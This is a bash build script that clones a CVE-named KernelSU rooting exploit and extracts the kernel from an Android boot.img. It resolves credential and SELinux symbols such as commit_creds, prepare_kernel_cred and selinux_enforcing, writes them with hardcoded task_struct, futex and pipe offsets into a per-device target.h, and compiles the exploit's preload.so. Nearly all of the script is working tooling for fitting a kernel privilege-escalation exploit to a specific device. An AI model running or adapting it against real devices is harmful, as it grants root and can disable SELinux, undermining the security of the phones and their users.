#!/bin/bash
set -e
DEVICE="$1"
WORKSPACE="${GITHUB_WORKSPACE:-$(pwd)}"

echo "=== Cloning source ==="
git clone --depth 1 https://github.com/woshimaniubi8/CVE-2026-43499-root-KernelSU.git jailbreak
cd jailbreak

echo "=== Inspecting reference target.h ==="
REF_TARGET=$(find . -name "target.h" -not -path "./.git/*" | head -n1)
[ -n "$REF_TARGET" ] && { echo "Reference: $REF_TARGET"; head -n 30 "$REF_TARGET"; } || echo "[*] No reference found"

echo "=== Parsing boot.img ==="
mkdir -p /tmp/kextract

python3 << PYEOF
import struct, sys

with open("$WORKSPACE/images/boot.img", 'rb') as f:
    hdr = f.read(4096)

assert hdr[:8] == b'ANDROID!', "Not a valid boot.img"

kernel_size = struct.unpack('<I', hdr[8:12])[0]

# Detect version: v3/v4 have header_size=1580 @ offset 20
header_size = struct.unpack('<I', hdr[20:24])[0]
if header_size == 1580:
    # v3/v4: kernel starts RIGHT AFTER header (not page-aligned!)
    page_size = struct.unpack('<Q', hdr[56:64])[0]
    if page_size == 0:
        page_size = 4096
    kernel_offset = header_size
    ver = "v3/v4"
elif header_size == 1660:
    # v2
    page_size = struct.unpack('<I', hdr[36:40])[0]
    kernel_offset = header_size
    ver = "v2"
else:
    # v0/v1
    page_size = struct.unpack('<I', hdr[36:40])[0]
    if page_size == 0:
        page_size = 2048
    kernel_offset = page_size
    ver = "v0/v1"

print(f"[+] {ver} boot.img: header_size={header_size}, page_size={page_size}, kernel @ {kernel_offset}, size={kernel_size}")

with open("$WORKSPACE/images/boot.img", 'rb') as f:
    f.seek(kernel_offset)
    kernel = f.read(kernel_size)

print(f"[+] Extracted {len(kernel)} bytes")
first = kernel[:16]
print(f"[+] First 16 bytes: {first.hex()}")

# Save raw kernel
with open('/tmp/kextract/kernel', 'wb') as o:
    o.write(kernel)

# Try to identify compression
if first[:2] == b'\x1f\x8b':
    print("[+] Detected: gzip")
elif first[:4] == b'\x04\x22\x4d\x18':
    print("[+] Detected: lz4 frame")
elif first[:2] == b'\x02\x21':
    print("[+] Detected: lz4 legacy")
elif first[:4] == b'\x28\xb5\x2f\xfd':
    print("[+] Detected: zstd")
elif first[:6] == b'\xfd\x37\x7a\x58\x5a\x00':
    print("[+] Detected: xz")
elif first[:4] == b'\x7fELF':
    print("[+] Detected: ELF (uncompressed vmlinux)")
else:
    print(f"[!] Unknown/unsupported compression: {first[:8].hex()}")
PYEOF

cd /tmp/kextract

echo "=== Attempt 1: vmlinux-to-elf ==="
python3 -c "
from vmlinux_to_elf.extract_vmlinux import extract_vmlinux
extract_vmlinux('/tmp/kextract/kernel', '/tmp/kextract/vmlinux')
" 2>/dev/null && { echo "[+] vmlinux-to-elf success"; VMLINUX_OK=1; } || { echo "[!] vmlinux-to-elf failed"; VMLINUX_OK=0; }

if [ "$VMLINUX_OK" != "1" ]; then
    echo "=== Attempt 2: extract-vmlinux (Linux official) ==="
    curl -fsSL -o extract-vmlinux https://raw.githubusercontent.com/torvalds/linux/master/scripts/extract-vmlinux 2>/dev/null
    chmod +x extract-vmlinux 2>/dev/null || true
    if [ -x ./extract-vmlinux ]; then
        ./extract-vmlinux /tmp/kextract/kernel > /tmp/kextract/vmlinux 2>/dev/null && [ -s /tmp/kextract/vmlinux ] && { echo "[+] extract-vmlinux success"; VMLINUX_OK=1; } || echo "[!] extract-vmlinux failed"
    fi
fi

if [ "$VMLINUX_OK" != "1" ]; then
    echo "=== Attempt 3: manual decompression ==="
    # Try each tool based on magic
    FIRST=$(xxd -l 4 -p /tmp/kextract/kernel)
    SUCCESS=0
    
    case "$FIRST" in
        1f8b*)
            echo "Trying gzip..."
            gzip -dc /tmp/kextract/kernel > /tmp/kextract/vmlinux 2>/dev/null && SUCCESS=1
            ;;
        04224d18)
            echo "Trying lz4 frame..."
            lz4 -dc /tmp/kextract/kernel > /tmp/kextract/vmlinux 2>/dev/null && SUCCESS=1
            ;;
        0221*)
            echo "Trying lz4 legacy..."
            lz4 -d -l /tmp/kextract/kernel /tmp/kextract/vmlinux 2>/dev/null && SUCCESS=1
            ;;
        28b52ffd)
            echo "Trying zstd..."
            zstd -dc /tmp/kextract/kernel > /tmp/kextract/vmlinux 2>/dev/null && SUCCESS=1
            ;;
        fd377a*)
            echo "Trying xz..."
            xz -dc /tmp/kextract/kernel > /tmp/kextract/vmlinux 2>/dev/null && SUCCESS=1
            ;;
        7f454c46)
            echo "Already ELF..."
            cp /tmp/kextract/kernel /tmp/kextract/vmlinux && SUCCESS=1
            ;;
    esac
    
    if [ "$SUCCESS" = "1" ] && [ -s /tmp/kextract/vmlinux ]; then
        echo "[+] Manual decompression success"
        VMLINUX_OK=1
    else
        echo "[!] All decompression failed"
        echo "=== Kernel hex dump (first 64 bytes) ==="
        xxd -l 64 /tmp/kextract/kernel
        exit 1
    fi
fi

echo "[+] vmlinux ready, size: $(stat -c%s /tmp/kextract/vmlinux 2>/dev/null || echo 0)"

echo "=== Extracting kernel symbols ==="
cd /tmp/kextract

KERNEL_BASE=$(aarch64-linux-gnu-nm vmlinux 2>/dev/null | grep ' T _text$' | awk '{print "0x"$1}' | head -n1)
[ -z "$KERNEL_BASE" ] && KERNEL_BASE="0xffffffc008000000"
echo "[+] Kernel base: $KERNEL_BASE"

get_sym() {
    local name="$1"
    local addr=$(aarch64-linux-gnu-nm vmlinux 2>/dev/null | grep " [Tt] $name\$" | awk '{print "0x"$1}' | head -n1)
    if [ -n "$addr" ] && [ "$addr" != "0x" ]; then
        python3 -c "print(hex($addr - $KERNEL_BASE))"
    else
        echo "0xDEADBEEF"
    fi
}

INIT_TASK=$(get_sym "init_task")
INIT_CRED=$(get_sym "init_cred")
COMMIT_CREDS=$(get_sym "commit_creds")
PREPARE_KERNEL_CRED=$(get_sym "prepare_kernel_cred")
OVERRIDE_CRED=$(get_sym "override_creds")
REVERT_CRED=$(get_sym "revert_creds")
SELINUX_ENFORCING=$(get_sym "selinux_enforcing")
SELINUX_STATE=$(get_sym "selinux_state")
SELINUX_SS=$(get_sym "selinux_ss")
PIPE_BUF_OPS=$(get_sym "pipe_buf_ops")
ANON_PIPE_BUF_OPS=$(get_sym "anon_pipe_buf_ops")

echo "Symbols: INIT_TASK=$INIT_TASK INIT_CRED=$INIT_CRED COMMIT_CREDS=$COMMIT_CREDS SELINUX_ENFORCING=$SELINUX_ENFORCING"

echo "=== Generating target.h ==="
cd "$WORKSPACE/jailbreak"
mkdir -p "src/targets/$DEVICE"

cat > "src/targets/$DEVICE/target.h" << EOF
#ifndef TARGET_H
#define TARGET_H

#define KERNEL_BASE     ${KERNEL_BASE}ULL

#define INIT_TASK       ${INIT_TASK}
#define INIT_CRED       ${INIT_CRED}
#define COMMIT_CREDS    ${COMMIT_CREDS}
#define PREPARE_KERNEL_CRED ${PREPARE_KERNEL_CRED}
#define OVERRIDE_CRED   ${OVERRIDE_CRED}
#define REVERT_CRED     ${REVERT_CRED}

#define SELINUX_ENFORCING ${SELINUX_ENFORCING}
#define SELINUX_STATE   ${SELINUX_STATE}
#define SELINUX_SS      ${SELINUX_SS}

#define PIPE_BUF_OPS    ${PIPE_BUF_OPS}
#define ANON_PIPE_BUF_OPS ${ANON_PIPE_BUF_OPS}

#define TASK_STRUCT_PID_OFFSET      0x5E0
#define TASK_STRUCT_CRED_OFFSET     0x778
#define TASK_STRUCT_MM_OFFSET       0x520
#define TASK_STRUCT_COMM_OFFSET     0x7B0
#define TASK_STRUCT_FLAGS_OFFSET    0x448

#define RT_MUTEX_WAITER_LIST_OFFSET     0x00
#define RT_MUTEX_WAITER_PI_LIST_OFFSET  0x10
#define RT_MUTEX_WAITER_TASK_OFFSET     0x30

#define FUTEX_WAITER_LIST_OFFSET    0x18
#define PIPE_BUF_OFFSET             0x40
#define PIPE_BUF_OPS_OFFSET         0x58

#endif
EOF

echo "[+] Generated target.h"
cat "src/targets/$DEVICE/target.h"

echo "=== Building preload.so ==="
make PROJECT="$DEVICE" -j$(nproc)

echo "=== Copying outputs ==="
cp "build/$DEVICE/bin/preload.so" "$WORKSPACE/preload.so"
cp "src/targets/$DEVICE/target.h" "$WORKSPACE/target.h"
echo "[+] Build complete"
